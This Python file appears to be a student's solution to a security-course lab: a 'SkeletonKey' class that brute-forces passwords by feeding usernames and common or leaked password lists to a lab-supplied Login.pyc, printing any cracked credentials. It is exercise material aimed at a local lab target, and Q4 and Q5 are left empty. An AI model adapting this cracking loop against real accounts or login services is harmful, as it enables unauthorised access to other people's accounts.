import subprocess

class SkeletonKey:
    ''' 
    Skeleton Key is an object designed to adapt to each questions' parameters and search for users' password(s).
    
    params:
        user_file_path
        - input the path to the file that contains usernames if applicable
        
        passwd_file_path 
        - input the path to the file than contains passwords
        
        users 
        - input the usernames of users if there is no file as a list
        
        exe_path
        - input the path of the python file to execute the command 'python3 [path] [username] [password]'

        cracked_users
        - Sets a maxmimum amount of users to crack for execessively long bruteforces
    
    '''
    def __init__(self, user_file_path=None, passwd_file_path=None, users=None, exe_path=None, cracked_users=None, print_interval=None):
        self.user_file_path = user_file_path
        self.passwd_file_path = passwd_file_path
        self.exe_path = exe_path
        self.cracked_users = cracked_users if cracked_users else set()
        self.users = self.compile_file_to_list() if user_file_path else list([users])
        self.print_interval = print_interval
    
    def compile_file_to_list(self):
        compiled_list = []
        with open(self.user_file_path, "r") as file:
            for row in file:
                item = row.strip()
                if item not in self.cracked_users:
                    compiled_list.append(item)
        
        return compiled_list

    def crack_pass_bruteforce(self, max_cracked=float('inf'), print_interval=None):
        cracked = 0
        try:
            for user in self.users:
                with open(self.passwd_file_path, "r") as file:
                    for number_runs, passwd in enumerate(file):
                        if print_interval:
                            if number_runs % print_interval == 0: 
                                print(f"###################################################\nProgressUpdate\nRun #{number_runs}\nTesting {user}->{passwd}###################################################\n")
                            
                        passwd = passwd.strip()
                        run = subprocess.run(["python3", self.exe_path, user, passwd], capture_output=True, text=True)
                        
                        if run.stdout == "Login successful.\n":
                            print(f"============================================\nCracked!\nUsername:{user}\nPassword:{passwd}\n============================================\n")
                            
                            cracked += 1
                            if cracked >= max_cracked: return
        
        except KeyboardInterrupt:
            print("Quit successfully\n")
        
if __name__ == '__main__':
    ###########################################
    ##########          Q1          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q1/MostCommonPWs",   # passwd path
        "SkyRedFalcon914",                   # users
        "/home/cse/Lab1/Q1/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      users = test_param[1],
                      exe_path = test_param[2])
    
    key.crack_pass_bruteforce()



    ###########################################
    ##########          Q2          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q2/MostCommonPWs",   # passwd path
        "/home/cse/Lab1/Q2/gang",            # user path
        "/home/cse/Lab1/Q2/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2],
                      cracked_users=['SkyRedFalcon914'])

    key.crack_pass_bruteforce()

    ###########################################
    ##########          Q3          ###########
    ###########################################
    test_param = [
        "/home/cse/Lab1/Q3/PwnedPWs100k",   # passwd path
        "/home/cse/Lab1/Q3/gang",            # user path
        "/home/cse/Lab1/Q3/Login.pyc"        # exe path
    ]
    key = SkeletonKey(passwd_file_path = test_param[0],
                      user_file_path = test_param[1],
                      exe_path = test_param[2],
                      cracked_users=set(["SkyRedFalcon914", "MontainBlueFalcon157"]))
    
    key.crack_pass_bruteforce(max_cracked=1, print_interval=10)



    ###########################################
    ##########          Q4          ###########
    ###########################################



    ###########################################
    ##########          Q5          ###########
    ###########################################         
            

            
